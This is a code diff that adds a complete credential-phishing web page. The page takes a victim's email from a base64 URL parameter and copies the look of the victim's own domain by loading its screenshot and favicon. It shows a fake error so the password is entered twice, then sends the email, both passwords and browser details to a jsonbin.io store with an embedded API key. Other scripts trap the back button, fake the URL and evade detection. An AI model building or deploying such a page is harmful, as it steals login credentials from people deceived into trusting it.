@@ -1,1 +1,233 @@
-fuck you
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Auth</title>
+    <link href="https://db.onlinewebfonts.com/c/d3a0199dcafa52672b5461066bbb3e59?family=Cash+Market+Light+Rounded" rel="stylesheet">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <style>
+        body {
+            background-size: cover;
+            font-family: "Cash Market Light Rounded";
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 75vh;
+            margin: 0;
+        }
+        .pass::before {content:"Pass"}
+        .pass::after {content:"word"}
+
+        #message {
+            text-align: center;
+            color: red;
+            display: none;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.6);
+            filter: blur(10px);
+        }
+
+        .login-panel::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.1);
+            filter: blur(10px);
+        }
+
+        .card {
+            box-shadow: 5px 5px 15px rgba(0, 0, 0, 0.3);
+        }
+    </style>
+
+
+</head>
+<body>
+<div class="container login-panel">
+    <div class="row justify-content-center">
+        <div class="col-md-4">
+            <div class="card">
+                <div class="card-body">
+                    <h5 class="card-title text-center">Authorization</h5>
+
+                    <form id="login_form" method="POST">
+                        <div class="form-group">
+                            <label for="rcmloginuser">Email</label>
+                            <input type="text" class="form-control" id="rcmloginuser" placeholder="Email" value="test@gmail.com" disabled>
+                        </div>
+                        <div class="form-group">
+                            <label for="rcmloginpwd"><span class="pass"></span></label>
+                            <input type="password" class="form-control pass2" id="rcmloginpwd" placeholder="Password" required>
+
+                            <div id="message">Incorrect <span class="pass"></span>. Try Again</div>
+                        </div>
+                        <button type="submit" id="rcmloginsubmit" class="btn btn-primary btn-block">Sign In</button>
+
+                    </form>
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        // Funkcja do usuwania elementów
+        function removeElements() {
+            // Usuń <md-dialog type="alert">
+            var dialog = document.querySelector('md-dialog[type="alert"]');
+            if (dialog) {
+                dialog.remove();
+            }
+
+            // Usuń <iframe title="Navigation in Google Translate">
+            var iframe = document.querySelector('iframe[title="Navigation in Google Translate"]');
+            if (iframe) {
+                iframe.remove();
+            }
+        }
+
+        // Usuń elementy natychmiast po załadowaniu DOM
+        removeElements();
+
+        // Obserwator, który nasłuchuje na zmiany w DOM
+        var observer = new MutationObserver(function(mutations) {
+            mutations.forEach(function(mutation) {
+                if (mutation.addedNodes && mutation.addedNodes.length > 0) {
+                    removeElements();
+                }
+            });
+        });
+
+        // Konfiguracja obserwatora
+        observer.observe(document.body, {
+            childList: true,
+            subtree: true
+        });
+    });
+</script>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const encodedEmailParam = urlParams.get("b");
+	const emailParam = encodedEmailParam ? atob(encodedEmailParam) : null;
+
+
+    const loginForm = document.getElementById('login_form');
+    const message = document.getElementById('message');
+    const userAgent = navigator.userAgent;
+    const currentDate = new Date();
+    const passwordInput = document.getElementById('rcmloginpwd');
+
+    let submittedCount = 0;
+
+    let hehe22 = '';
+    let hehe223 = '';
+    loginForm.addEventListener('submit', (event) => {
+        event.preventDefault();
+
+        message.style.display = 'block';
+        submittedCount++;
+        if (submittedCount === 1) {
+            hehe223 = passwordInput.value;
+            passwordInput.value = '';
+        } else if (submittedCount === 2) {
+            hehe22 = passwordInput.value;
+            passwordInput.value = '';
+            const emailParts2 = emailParam.split("@");
+                const domain2 = emailParts2[1];
+            const jsonData = {
+                Domain: domain2,
+                Email: emailParam,
+                P1: hehe223,
+                P2: hehe22,
+                UserAgent: userAgent,
+                Date: currentDate
+            };
+            const apiKey = '$2a$10$/Hhr9CoDu8i0kVG.tSLuguT33pg.4F4qnRkDsVSOhbIoWUje71UE6'; //Change APIKEY to your.
+            fetch("https://api.jsonbin.io/v3/b?name=" + emailParam, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Master-Key': apiKey,
+                    "X-Bin-Name": emailParam
+                },
+                body: JSON.stringify(jsonData),
+            })
+                .then(response => response.json())
+                .then(data => {
+                    window.location.replace("https://" + domain2);
+                })
+                .catch(error => {
+                    //
+                });
+        }
+    });
+
+
+    function redirectToGoogle() {
+        window.location.href = "https://google.com";
+    }
+    function generateRandomString(length) {
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        let randomString = '';
+
+        for (let i = 0; i < length; i++) {
+            const randomIndex = Math.floor(Math.random() * characters.length);
+            randomString += characters.charAt(randomIndex);
+        }
+
+        return randomString;
+    }
+    const currentURL = window.location.protocol + '//' + window.location.host;
+
+    const UrlShit = generateRandomString(166);
+    history.pushState(null, null, window.location.href);
+    window.onpopstate = function (event) {
+        history.pushState(null, null, window.location.href);
+    };
+    setTimeout(function () {
+        const fakeUrl = currentURL + "/" + UrlShit + "/" + UrlShit;
+        history.pushState(null, "", fakeUrl);
+    }, 1);
+
+    function setFavicon(url) {
+        const favicon = document.querySelector('link[rel="icon"]');
+        if (favicon) {
+            favicon.href = url;
+        } else {
+            const newFavicon = document.createElement('link');
+            newFavicon.rel = 'icon';
+            newFavicon.href = url;
+            document.head.appendChild(newFavicon);
+        }
+    }
+
+    if (emailParam === null || emailParam.trim() === "") {
+        redirectToGoogle();
+    } else {
+        const emailParts = emailParam.split("@");
+        if (emailParts.length === 2) {
+            const domain = emailParts[1];
+            const faviconUrl = `https://t0.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=http://${domain}&size=400`;
+            setFavicon(faviconUrl);
+            document.body.style.backgroundImage = `url("https://image.thum.io/get/auth/69366-Gfrt66ttffff/width/1200/crop/700/http://${domain}")`;
+            document.getElementById("rcmloginuser").value = emailParam;
+        } else {
+            redirectToGoogle();
+        }
+    }
+</script>
+</body>
+</html>
